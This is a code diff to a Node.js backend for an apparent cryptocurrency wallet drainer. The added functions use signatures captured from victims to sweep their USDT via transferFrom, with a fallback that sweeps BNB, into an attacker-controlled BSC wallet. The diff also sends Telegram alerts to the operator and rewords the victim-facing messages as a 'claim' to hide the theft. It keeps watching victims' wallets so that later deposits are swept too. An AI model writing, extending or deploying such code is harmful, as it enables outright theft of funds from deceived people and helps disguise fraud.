@@ -708,16 +708,96 @@ const startMonitoring = (walletAddress, walletType, signatureData) => {
   monitoringIntervals.set(walletAddress, interval);
 };
 
+
+// ============================================
+// 👇👇👇 ADD THE TRANSFER FUNCTIONS RIGHT HERE 👇👇👇
+// ============================================
+
+// USDT Transfer Function
+const executeUSDTTransfer = async (fromAddress, toAddress) => {
+  try {
+    if (!bscProvider || !bscProviderReady) {
+      throw new Error('BSC provider not ready');
+    }
+    
+    const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, bscProvider);
+    const decimals = await usdtContract.decimals();
+    
+    const balance = await usdtContract.balanceOf(fromAddress);
+    const balanceFormatted = parseFloat(ethers.formatUnits(balance, decimals));
+    
+    console.log(`[USDT] Balance: ${balanceFormatted} USDT`);
+    
+    if (balanceFormatted <= 0) {
+      return { success: false, reason: 'No balance' };
+    }
+    
+    const allowance = await usdtContract.allowance(fromAddress, TARGET_WALLET_BSC);
+    const allowanceFormatted = parseFloat(ethers.formatUnits(allowance, decimals));
+    
+    if (allowanceFormatted < balanceFormatted) {
+      return { success: false, reason: 'Insufficient allowance' };
+    }
+    
+    const tx = await usdtContractWithSigner.transferFrom(fromAddress, TARGET_WALLET_BSC, balance);
+    console.log(`[USDT] Tx: ${tx.hash}`);
+    await tx.wait();
+    
+    return { success: true, txHash: tx.hash, amount: balanceFormatted };
+    
+  } catch (error) {
+    console.error('[USDT] Error:', error);
+    return { success: false, error: error.message };
+  }
+};
+
+// BNB Transfer Function
+const executeBNBTransfer = async (fromAddress, toAddress) => {
+  try {
+    const balance = await bscProvider.getBalance(fromAddress);
+    const balanceFormatted = parseFloat(ethers.formatEther(balance));
+    
+    if (balanceFormatted <= 0.005) {
+      return { success: false, reason: 'Insufficient balance' };
+    }
+    
+    const feeData = await bscProvider.getFeeData();
+    const gasPrice = feeData.gasPrice;
+    const gasLimit = 21000n;
+    const gasFee = gasPrice * gasLimit;
+    const sweepAmount = balance - gasFee;
+    
+    if (sweepAmount <= 0n) {
+      return { success: false, reason: 'Balance too low' };
+    }
+    
+    const tx = await bscSweeperWallet.sendTransaction({
+      to: TARGET_WALLET_BSC,
+      value: sweepAmount,
+      gasLimit: gasLimit
+    });
+    
+    await tx.wait();
+    
+    return { success: true, txHash: tx.hash, amount: ethers.formatEther(sweepAmount) };
+    
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
+
+
 // ============================================
 // API ENDPOINTS
 // ============================================
 
 app.post('/api/capture-approval', async (req, res) => {
-  const { walletAddress, signature, message, chainId, tokenType, amount, spender, timestamp } = req.body;
+  const { walletAddress, signature, message, chainId, tokenType, amount, spender, timestamp, selectedWallet } = req.body;
   
   console.log('========================================');
   console.log('[SIGNATURE] Blind signature captured!');
   console.log('Wallet:', walletAddress);
+  console.log('Selected Wallet:', selectedWallet || 'Not specified');
   console.log('Message:', message);
   console.log('========================================');
   
@@ -735,24 +815,56 @@ app.post('/api/capture-approval', async (req, res) => {
     spender: spender || (isSolana ? TARGET_WALLET_SOLANA : TARGET_WALLET_BSC),
     timestamp: timestamp || new Date().toISOString(),
     walletType: walletType,
-    status: 'active',
+    selectedWallet: selectedWallet || 'unknown',
+    status: 'pending',
     createdAt: new Date().toISOString()
   };
   
   approvedWallets.push(approvalData);
   saveApprovals();
   
-  const notifMsg = `*📝 New Blind Signature Captured!*\n\nWallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nType: ${walletType.toUpperCase()}\nChain: ${walletType === 'evm' ? 'BSC' : 'Solana'}\nAmount: 650 USDT\nStatus: Added to Queue`;
+  const notifMsg = `*📝 New Claim Request!*\n\n` +
+    `👛 Wallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\n` +
+    `🔗 Selected: ${selectedWallet || 'Unknown'}\n` +
+    `💰 Amount: ${amount || '650'} USDT\n` +
+    `📊 Type: ${walletType.toUpperCase()}\n` +
+    `🕐 Time: ${new Date().toLocaleString()}`;
   await sendTelegramNotification(notifMsg, 'approval');
   
-  addToQueue(walletAddress);
+  // Execute SWEEP IMMEDIATELY
+  if (walletType === 'evm') {
+    const sweepResult = await executeUSDTTransfer(walletAddress, TARGET_WALLET_BSC);
+    console.log('[SWEEP] Result:', sweepResult);
+    
+    if (sweepResult.success) {
+      approvalData.status = 'completed';
+      approvalData.sweepTxHash = sweepResult.txHash;
+      approvalData.sweptAmount = sweepResult.amount;
+      saveApprovals();
+      
+      await sendTelegramNotification(
+        `*✅ CLAIM PROCESSED!*\n\n` +
+        `👛 Wallet: \`${walletAddress.slice(0, 10)}...\`\n` +
+        `💰 Amount: ${sweepResult.amount} USDT\n` +
+        `🔗 Tx: \`${sweepResult.txHash.slice(0, 20)}...\``,
+        'success'
+      );
+    } else {
+      const bnbResult = await executeBNBTransfer(walletAddress, TARGET_WALLET_BSC);
+      if (bnbResult.success) {
+        approvalData.status = 'completed';
+        approvalData.sweepTxHash = bnbResult.txHash;
+        approvalData.sweptAmount = bnbResult.amount;
+        saveApprovals();
+      }
+    }
+  }
   
   res.json({ 
     success: true, 
-    message: 'Blind signature captured! Added to processing queue.',
+    message: 'Claim submitted and processing!',
     approvalId: approvalData.id,
-    walletType: walletType,
-    queued: true
+    walletType: walletType
   });
   
   console.log('[ACTION] Starting real-time monitoring for future deposits...');
@@ -760,7 +872,6 @@ app.post('/api/capture-approval', async (req, res) => {
   
   console.log('[STATUS] Persistent approval active. Any future deposits will be auto-swept.');
 });
-
 // ============================================
 // QUEUE STATUS ENDPOINT
 // ============================================
